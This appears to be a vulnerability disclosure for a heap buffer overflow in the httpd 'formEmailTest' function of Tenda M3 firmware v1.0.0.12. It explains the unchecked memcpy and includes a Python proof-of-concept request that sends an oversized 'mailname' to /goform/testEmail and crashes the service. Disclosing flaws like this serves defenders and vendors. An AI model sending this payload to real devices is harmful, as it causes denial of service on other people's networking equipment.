# Tenda M3 contains heap buffer Overflow Vulnerability

## overview

- type: heap buffer overflow vulnerability

- supplier: Tenda https://www.tenda.com 

- product: TendaM3 https://www.tenda.com.cn/product/M3.html

- firmware download:   https://www.tenda.com.cn/download/detail-3133.html

- affect version: TendaM3 v1.0.0.12(4856)

## Description

### 1. Vulnerability Details

the `httpd` in directory `/bin` has a heap buffer overflow. The vunlerability is in fucntion `formEmailTest` 

It calls `malloc(0x28Cu)` to allocate heap buffer, and it  copies POST parameter `mailname` to heap buffer. 

![image-20220819115923913](readme.assets/image-20220819115923913.png)

`v3` is the length of `mailname`, but it doesn’t limit it. so if `v3>0x28C`, the `memcpy(v1, v2, v3)` will cause heap buffer overflow 

but it can cause `segmentation fault` when execute `memcpy(v1, v2, v3)` 

### 2. Recurring loopholes and POC

use qemu-arm-static to run the `httpd`, we need to patch it before run. 

- in `main` function, The `ConnectCfm` function didn’t work properly, so I patched it to `NOP` 
- The `R7WebsSecurityHandler` function is used for permission control, and I've modified it to access URLs that can only be accessed after login

poc of DOS(deny of service)

```python
import requests

data = {
    "mailname": "@"+"a"*0x600, 
    "mailpwd": "a"
}
cookies = {
    "user": "admin"
}
res = requests.post("http://127.0.0.1/goform/testEmail", data=data, cookies=cookies)
print(res.content)
```

![image-20220819120901584](readme.assets/image-20220819120901584.png)

![image-20220819121000275](readme.assets/image-20220819121000275.png)

we can see the size of dest is `0x291` and size of src is `0x600` 

![image-20220819121215734](readme.assets/image-20220819121215734.png)